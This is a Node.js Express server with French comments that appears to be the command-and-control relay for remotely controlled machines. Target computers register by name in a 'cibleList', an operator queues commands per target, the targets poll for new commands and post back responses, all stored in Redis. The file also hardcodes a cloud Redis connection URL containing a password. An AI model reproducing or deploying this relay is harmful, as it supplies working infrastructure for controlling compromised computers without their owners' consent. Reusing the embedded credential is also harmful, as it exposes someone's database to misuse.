const express = require('express');
const Redis = require('ioredis');
const app = express();

const redis = new Redis('redis://default:KJigfboh7I4DYdXfJMXbaq79hTRZ4o3J@redis-19821.c14.us-east-1-2.ec2.redns.redis-cloud.com:19821');

redis.on('connect', () => {
    console.log('Connecté à Redis');
});

redis.on('error', (err) => {
    console.error('Erreur Redis: ', err);
});

app.use(express.json());

// Endpoint de base
app.get('/', (req, res) => {
    res.send({ message: 'Bridge Com !' });
});

// Récupération de la liste des cibles
app.get('/cibles', async (req, res) => {
    const cibleList = JSON.parse(await redis.get('cibleList')) || [];
    res.json({ cibleList });
});

// Récupération de la liste des commandes
app.get('/commandes', async (req, res) => {
    const commandes = JSON.parse(await redis.get('commandes')) || [];
    res.json({ commandes });
});

// Ajout d'un nom d'ordinateur
app.post('/identify', async (req, res) => {
    const { computer_name = 'Unknown' } = req.body;
    const cibleList = JSON.parse(await redis.get('cibleList')) || [];

    let isExist=false
    cibleList.forEach((cible) => {
        if(cible == computer_name){
            isExist=true
        }
    })
    !isExist & cibleList.push(computer_name)
    await redis.set('cibleList', JSON.stringify(cibleList));
    res.json({ message: `Request from computer: ${computer_name}`, cibleList });
});

// Ajout d'une commande
app.post('/commande', async (req, res) => {
    const { commande } = req.body;
    if (!commande) {
        return res.status(400).json({ message: "Commande est requise." });
    }

    const commandes = JSON.parse(await redis.get('commandes')) || [];
    const cmdInfo = commande.split("%");

    let isExist = false;
    for (let i = 0; i < commandes.length; i++) {
        const dataInfo = commandes[i].split("%");
        if (dataInfo[0] === cmdInfo[0]) {
            commandes[i] = commande;
            isExist = true;
        }
    }

    if (!isExist) commandes.push(commande);
    await redis.set('commandes', JSON.stringify(commandes));
    res.json({ message: `Commande ajoutée: ${commande}`, commandes });
});

// Récupération d'une commande spécifique
app.post('/getCommande', async (req, res) => {
    const { info } = req.body;
    const commandes = JSON.parse(await redis.get('commandes')) || [];
    const dataInfo = info.split("%");
    let newCmd = "";

    commandes.forEach((cmd) => {
        const dataCmd = cmd.split("%");

        if (dataCmd[0] === dataInfo[0] && (dataCmd[1] !== dataInfo[1] || dataCmd[2] !== dataInfo[2])) {
            newCmd = cmd;
        }
    });

    if (newCmd) {
        res.json({ message: 'nouveau commande', commande: newCmd });
    } else {
        res.json({ message: 'Aucune nouveau commande' });
    }
});

// Ajout d'une reponse
app.post('/reponse', async (req, res) => {
    const { reponse } = req.body;
    if (!reponse) {
        return res.status(400).json({ message: "Reponse est requise." });
    }

    const reponses = JSON.parse(await redis.get('reponses')) || [];
    const repInfo = reponse.split("%");

    let isExist = false;
    for (let i = 0; i < reponses.length; i++) {
        const dataInfo = reponses[i].split("%");
        if (dataInfo[0] === repInfo[0]) {
            reponses[i] = reponse;
            isExist = true;
        }
    }

    if (!isExist) reponses.push(reponse);
    await redis.set('reponses', JSON.stringify(reponses));
    res.json({ message: `Reponse ajoutée: ${reponse}`, reponses });
});

// Récupération d'une réponse spécifique
app.post('/getReponse', async (req, res) => {
    const { info } = req.body;
    const reponses = JSON.parse(await redis.get('reponses')) || [];
    let newRep = "";

    reponses.forEach((rep) => {
        const dataRep = rep.split("%");
        if (dataRep[0] === info) {
            newRep = rep;
        }
    });

    if (newRep) {
        res.json({ message: 'reponse', reponse: newRep });
    } else {
        res.json({ message: 'Aucune reponse' });
    }
});

const PORT = 5000;

app.listen(PORT, () => console.log(`🚀 @ http://localhost:${PORT}`));
